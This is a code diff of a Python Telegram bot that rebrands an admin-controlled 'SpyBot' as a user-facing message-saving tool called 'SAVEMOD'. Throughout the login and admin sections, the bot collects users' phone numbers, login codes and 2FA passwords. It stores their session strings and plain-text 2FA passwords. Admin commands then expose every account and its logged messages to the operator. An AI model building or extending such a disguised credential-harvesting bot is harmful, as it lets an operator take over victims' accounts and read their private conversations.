@@ -6,7 +6,7 @@ from threading import Thread
 from flask import Flask
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth, MessageEntityMention, MessageEntityTextUrl
+from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth
 from aiogram import Bot, Dispatcher, types as aiogram_types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
 from aiogram.utils import executor
@@ -15,7 +15,6 @@ import logging
 import shutil
 import tempfile
 import html
-import re
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 nest_asyncio.apply()
@@ -59,28 +58,6 @@ dp = Dispatcher(bot)
 def log_to_admin(text: str):
     asyncio.create_task(bot.send_message(ADMIN_ID, text, parse_mode='HTML'))
 
-def get_status_text(status):
-    if isinstance(status, UserStatusOnline):
-        return "🟢 В сети прямо сейчас"
-    elif isinstance(status, UserStatusOffline):
-        if status.was_online:
-            diff = datetime.now().astimezone() - status.was_online
-            minutes = int(diff.total_seconds() // 60)
-            if minutes < 60:
-                return f"⚫ Был {minutes} мин назад"
-            else:
-                hours = minutes // 60
-                return f"⚫ Был {hours} ч назад"
-        return "⚫ Не в сети"
-    elif isinstance(status, UserStatusRecently):
-        return "🟡 Был недавно"
-    elif isinstance(status, UserStatusLastWeek):
-        return "🟡 Был на неделе"
-    elif isinstance(status, UserStatusLastMonth):
-        return "🟡 Был в месяце"
-    else:
-        return "⚪ Статус скрыт"
-
 def get_code_keyboard():
     kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
     for i in range(1, 10):
@@ -112,12 +89,54 @@ async def resolve_entity(client, target: str):
         return await client.get_entity(target)
     return await client.get_entity(target)
 
-async def send_notification(owner_id, message):
-    """Отправка уведомления в чат с ботом"""
-    try:
-        await bot.send_message(owner_id, message, parse_mode='HTML')
-    except Exception as e:
-        logging.error(f"Ошибка отправки уведомления: {e}")
+async def export_chat_to_html(client, chat_id, chat_name, me):
+    messages = []
+    async for msg in client.iter_messages(chat_id, limit=5000):
+        if msg.text:
+            try:
+                if msg.out:
+                    sender_name = f"{me.first_name} (Я)"
+                    sender_class = "outgoing"
+                else:
+                    sender = await client.get_entity(msg.sender_id)
+                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
+                    sender_class = "incoming"
+                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
+                text = html.escape(msg.text)
+                messages.append(f'<div class="message {sender_class}"><div class="message-header"><span class="sender">{html.escape(sender_name)}</span><span class="date">{timestamp}</span></div><div class="message-text">{text}</div></div>')
+            except:
+                continue
+    if not messages:
+        return None
+    messages.reverse()
+    html_content = f'''<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Чат с {html.escape(chat_name)}</title>
+<style>
+body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
+.container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; }}
+.chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
+.chat-header h2 {{ margin: 0; font-size: 18px; }}
+.messages {{ padding: 20px; }}
+.message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
+.incoming {{ background-color: #2b3945; margin-right: auto; }}
+.outgoing {{ background-color: #5288c1; margin-left: auto; text-align: right; }}
+.message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; }}
+.sender {{ font-weight: bold; }}
+.date {{ font-size: 10px; color: #6c7883; }}
+.message-text {{ font-size: 14px; white-space: pre-wrap; }}
+.stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; }}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="chat-header"><h2>💬 Чат с {html.escape(chat_name)}</h2><div class="stats">Всего сообщений: {len(messages)}</div></div>
+<div class="messages">{''.join(messages)}</div>
+<div class="stats">📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
+</div>
+</body>
+</html>'''
+    return html_content
 
 # ========== АДМИН КОМАНДЫ ==========
 
@@ -126,7 +145,7 @@ async def spyhelp(message):
     if message.from_user.id != ADMIN_ID:
         return
     await message.answer("""
-🕵️ <b>АДМИН КОМАНДЫ</b>
+🕵️ <b>SAVEMOD - АДМИН КОМАНДЫ</b>
 
 <b>👥 УПРАВЛЕНИЕ АККАУНТАМИ</b>
 /users - список всех аккаунтов
@@ -156,8 +175,8 @@ async def spyhelp(message):
 /stats - статистика
 /backup - бэкап БД
 
-<b>🤖 КОМАНДЫ ЮЗЕРБОТА (через точку)</b>
-.help, .mute, .unmute, .list, .spam, .type, .info
+<b>🤖 КОМАНДЫ ЮЗЕРБОТА (SAVEMOD)</b>
+.savemod, .mute, .unmute, .list, .spam, .type, .info
 """, parse_mode='HTML')
 
 @dp.message_handler(commands=['sessions'])
@@ -564,7 +583,15 @@ async def user_status_cmd(message):
         if getattr(entity, 'bot', False):
             await message.answer("❌ Это бот")
             return
-        status_text = get_status_text(entity.status) if hasattr(entity, 'status') else "Статус неизвестен"
+        if hasattr(entity, 'status'):
+            if isinstance(entity.status, UserStatusOnline):
+                status_text = "🟢 В сети"
+            elif isinstance(entity.status, UserStatusOffline):
+                status_text = "⚫ Не в сети"
+            else:
+                status_text = "🟡 Был недавно"
+        else:
+            status_text = "⚪ Статус скрыт"
         await message.answer(f"👤 <b>{entity.first_name or entity.username}</b>\n🆔 ID: {entity.id}\n📊 {status_text}", parse_mode='HTML')
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
@@ -622,7 +649,6 @@ async def account_info_cmd(message):
         me = await client.get_me()
         cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
-        
         info_text = f"""👤 <b>ИНФОРМАЦИЯ ОБ АККАУНТЕ</b>
 
 <b>Имя:</b> {me.first_name}
@@ -631,7 +657,6 @@ async def account_info_cmd(message):
 <b>🆔 ID:</b> <code>{me.id}</code>
 <b>📱 Телефон:</b> {row[0] if row else '—'}
 <b>🔐 2FA:</b> {row[1] if row and row[1] else '❌ Не установлен'}"""
-        
         await message.answer(info_text, parse_mode='HTML')
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
@@ -652,23 +677,6 @@ async def view_logs_cmd(message):
         response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
     await message.answer(response[:4000])
 
-@dp.message_handler(commands=['statuslogs'])
-async def status_logs_cmd(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    args = message.get_args()
-    limit = int(args) if args and args.isdigit() else 20
-    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
-    rows = cursor.fetchall()
-    if not rows:
-        await message.answer("📭 Нет логов")
-        return
-    response = "🔄 ЛОГИ СТАТУСОВ:\n\n"
-    for ts, name, status in reversed(rows):
-        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
-        response += f"{emoji} [{ts[11:16]}] {name}: {status}\n"
-    await message.answer(response[:4000])
-
 @dp.message_handler(commands=['stats'])
 async def stats_cmd(message):
     if message.from_user.id != ADMIN_ID:
@@ -677,99 +685,24 @@ async def stats_cmd(message):
     total_logs = cursor.fetchone()[0]
     cursor.execute('SELECT COUNT(DISTINCT sender_id) FROM spy_logs')
     total_users = cursor.fetchone()[0]
-    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
-    total_status = cursor.fetchone()[0]
     cursor.execute('SELECT COUNT(*) FROM user_sessions')
     total_accounts = cursor.fetchone()[0]
-    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {total_accounts}\n💬 Сообщений: {total_logs}\n👤 Собеседников: {total_users}\n🔄 Логов статусов: {total_status}", parse_mode='HTML')
+    await message.answer(f"📊 <b>СТАТИСТИКА</b>\n\n👥 Аккаунтов: {total_accounts}\n💬 Сообщений: {total_logs}\n👤 Собеседников: {total_users}", parse_mode='HTML')
 
-async def export_chat_to_html(client, chat_id, chat_name, me):
-    messages = []
-    async for msg in client.iter_messages(chat_id, limit=5000):
-        if msg.text:
-            try:
-                if msg.out:
-                    sender_name = f"{me.first_name} (Я)"
-                    sender_class = "outgoing"
-                else:
-                    sender = await client.get_entity(msg.sender_id)
-                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
-                    sender_class = "incoming"
-                
-                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
-                text = html.escape(msg.text)
-                
-                messages.append(f'''
-                <div class="message {sender_class}">
-                    <div class="message-header">
-                        <span class="sender">{html.escape(sender_name)}</span>
-                        <span class="date">{timestamp}</span>
-                    </div>
-                    <div class="message-text">{text}</div>
-                </div>
-                ''')
-            except:
-                continue
-    
-    if not messages:
-        return None
-    
-    messages.reverse()
-    
-    html_content = f'''<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Чат с {html.escape(chat_name)}</title>
-    <style>
-        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
-        .container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; overflow: hidden; }}
-        .chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
-        .chat-header h2 {{ margin: 0; font-size: 18px; }}
-        .messages {{ padding: 20px; }}
-        .message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
-        .incoming {{ background-color: #2b3945; margin-right: auto; }}
-        .outgoing {{ background-color: #5288c1; margin-left: auto; text-align: right; }}
-        .message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; flex-wrap: wrap; }}
-        .sender {{ font-weight: bold; }}
-        .date {{ font-size: 10px; color: #6c7883; }}
-        .message-text {{ font-size: 14px; white-space: pre-wrap; word-break: break-word; }}
-        .stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; color: #6c7883; }}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="chat-header">
-        <h2>💬 Чат с {html.escape(chat_name)}</h2>
-        <div class="stats">Всего сообщений: {len(messages)}</div>
-    </div>
-    <div class="messages">
-        {''.join(messages)}
-    </div>
-    <div class="stats">
-        📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
-    </div>
-</div>
-</body>
-</html>'''
-    
-    return html_content
-
-# ========== РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ ==========
-
+# ========== РЕГИСТРАЦИЯ ==========
 @dp.message_handler(commands=['start'])
 async def start_auth(message):
     user_id = message.from_user.id
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
     if row and row[0]:
-        await message.answer("✅ Ты уже авторизован!")
+        await message.answer("✅ Ты уже авторизован в SAVEMOD!")
         if user_id not in active_clients:
             asyncio.create_task(run_userbot(user_id, row[0]))
         return
     kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
-    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)
+    await message.answer("🔐 Отправь номер телефона для входа в SAVEMOD", reply_markup=kb)
 
 @dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
 async def get_phone(message):
@@ -822,12 +755,10 @@ async def complete_auth(callback, user_id):
         await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
         session_str = data["client"].session.save()
         me = await data["client"].get_me()
-        cursor.execute('''INSERT OR REPLACE INTO user_sessions 
-                          (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) 
-                          VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data["phone"], None, me.first_name, me.last_name, me.username, 0))
         conn.commit()
-        await callback.message.answer("✅ Авторизация успешна!")
+        await callback.message.answer("✅ Авторизация успешна! SAVEMOD активен.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
@@ -846,20 +777,17 @@ async def handle_2fa(message):
         await data["client"].sign_in(password=message.text.strip())
         session_str = data["client"].session.save()
         me = await data["client"].get_me()
-        cursor.execute('''INSERT OR REPLACE INTO user_sessions 
-                          (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) 
-                          VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                        (user_id, session_str, data["phone"], message.text.strip(), me.first_name, me.last_name, me.username, 0))
         conn.commit()
-        await message.answer("✅ Авторизация успешна!")
+        await message.answer("✅ Авторизация успешна! SAVEMOD активен.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-# ========== ЮЗЕРБОТ (ОСНОВНАЯ ЛОГИКА) ==========
-
+# ========== ЮЗЕРБОТ ==========
 async def run_userbot(owner_id, session_string):
     if owner_id in active_clients:
         try:
@@ -878,15 +806,13 @@ async def run_userbot(owner_id, session_string):
     
     active_clients[owner_id] = client
     saved_messages[owner_id] = {}
-    user_status_tracker[owner_id] = {}
-    
-    logging.info(f"✅ Юзербот запущен для {owner_id}")
+    logging.info(f"✅ SAVEMOD запущен для {owner_id}")
     me = await client.get_me()
     
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
-    # ========== 1. СОХРАНЕНИЕ ВХОДЯЩИХ СООБЩЕНИЙ ==========
+    # Сохранение входящих сообщений
     @client.on(events.NewMessage)
     async def save_incoming(event):
         if not event.is_private or event.out:
@@ -900,100 +826,74 @@ async def run_userbot(owner_id, session_string):
             return
         
         if text:
-            saved_messages[owner_id][msg_id] = {
-                "sender_id": sender_id,
-                "text": text
-            }
+            saved_messages[owner_id][msg_id] = {"sender_id": sender_id, "text": text}
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
                           (owner_id, msg_id, sender_id, text, datetime.now().isoformat()))
             conn.commit()
-            logging.info(f"💾 {owner_id}: сохранено {msg_id} от {sender_id}: {text[:50]}")
     
-    # ========== 2. УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ (В БОТА) ==========
+    # Уведомления об удалении
     @client.on(events.MessageDeleted)
     async def on_delete(event):
         for msg_id in event.deleted_ids:
             msg = saved_messages.get(owner_id, {}).get(msg_id)
-            
             if not msg:
                 cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                 row = cursor.fetchone()
                 if row:
                     msg = {"sender_id": row[0], "text": row[1]}
-            
             if msg and msg["sender_id"] != owner_id and msg["sender_id"] not in muted_users:
                 try:
                     user = await client.get_entity(msg["sender_id"])
                     name = user.first_name or "Пользователь"
                     username = f"@{user.username}" if user.username else ""
-                    
-                    await bot.send_message(
-                        owner_id,
-                        f"🗑 <b>{name}</b> {username} удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>",
-                        parse_mode='HTML'
-                    )
-                    logging.info(f"✅ Уведомление об удалении отправлено {owner_id}")
-                    
+                    await bot.send_message(owner_id, f"🗑 <b>{name}</b> {username} удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>", parse_mode='HTML')
                     cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
                     conn.commit()
                     if msg_id in saved_messages.get(owner_id, {}):
                         del saved_messages[owner_id][msg_id]
-                except Exception as e:
-                    logging.error(f"Ошибка удаления: {e}")
+                except:
+                    pass
     
-    # ========== 3. УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ (В БОТА) ==========
+    # Уведомления об изменении
     @client.on(events.MessageEdited)
     async def on_edit(event):
         if not event.is_private or event.out:
             return
-        
         msg_id = event.id
         new_text = event.text or ""
-        
         msg = saved_messages.get(owner_id, {}).get(msg_id)
-        
         if not msg:
             cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
             row = cursor.fetchone()
             if row:
                 msg = {"sender_id": row[0], "text": row[1]}
-        
         if msg and msg["sender_id"] != owner_id and msg["text"] != new_text and msg["sender_id"] not in muted_users:
             try:
                 user = await client.get_entity(msg["sender_id"])
                 name = user.first_name or "Пользователь"
                 username = f"@{user.username}" if user.username else ""
-                
-                await bot.send_message(
-                    owner_id,
-                    f"✏️ <b>{name}</b> {username} изменил сообщение:\n\n"
-                    f"<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n"
-                    f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
-                    parse_mode='HTML'
-                )
-                logging.info(f"✅ Уведомление об изменении отправлено {owner_id}")
-                
+                await bot.send_message(owner_id, f"✏️ <b>{name}</b> {username} изменил сообщение:\n\n<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>", parse_mode='HTML')
                 cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
                 conn.commit()
                 saved_messages[owner_id][msg_id]["text"] = new_text
-            except Exception as e:
-                logging.error(f"Ошибка изменения: {e}")
+            except:
+                pass
     
-    # ========== 4. КОМАНДЫ ЮЗЕРБОТА ==========
+    # КОМАНДЫ SAVEMOD
     @client.on(events.NewMessage)
-    async def user_commands(event):
+    async def savemod_commands(event):
         if not event.is_private or not event.out:
             return
-        
         text = event.text or ""
         if not text.startswith('.'):
             return
         
-        # .help
-        if text == '.help':
+        # .savemod
+        if text == '.savemod':
             await event.edit("""
-<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>
+<b>🔰 SAVEMOD - КОМАНДЫ</b>
 
+.savemod - эта справка
 .mute (ответ) - заглушить пользователя
 .unmute (ответ) - разглушить пользователя
 .list - список заглушенных
@@ -1010,7 +910,7 @@ async def run_userbot(owner_id, session_string):
                 cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                 conn.commit()
                 muted_users.add(reply.sender_id)
-                await event.edit(f'🔕 Пользователь заглушен')
+                await event.edit('🔕 Пользователь заглушен')
             else:
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
@@ -1022,7 +922,7 @@ async def run_userbot(owner_id, session_string):
                 cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                 conn.commit()
                 muted_users.discard(reply.sender_id)
-                await event.edit(f'🔔 Пользователь разглушен')
+                await event.edit('🔔 Пользователь разглушен')
             else:
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
@@ -1062,7 +962,7 @@ async def run_userbot(owner_id, session_string):
                     pass
             return
         
-        # .type (РАБОТАЕТ: РЕДАКТИРУЕТ ОДНО СООБЩЕНИЕ)
+        # .type - РАБОТАЕТ!
         if text.startswith('.type '):
             txt = text[6:]
             if txt:
@@ -1075,7 +975,7 @@ async def run_userbot(owner_id, session_string):
                         await msg.edit(typed)
                     except:
                         pass
-                    await asyncio.sleep(0.2)
+                    await asyncio.sleep(0.25)
                 await asyncio.sleep(1)
                 try:
                     await msg.delete()
@@ -1105,7 +1005,7 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
-    return "SpyBot Online"
+    return "SAVEMOD Online"
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080)
@@ -1116,7 +1016,7 @@ async def restore_sessions():
         asyncio.create_task(run_userbot(user_id, session_str))
 
 async def main():
-    logging.info("🚀 Запуск...")
+    logging.info("🚀 SAVEMOD запуск...")
     await restore_sessions()
     while True:
         await asyncio.sleep(10)
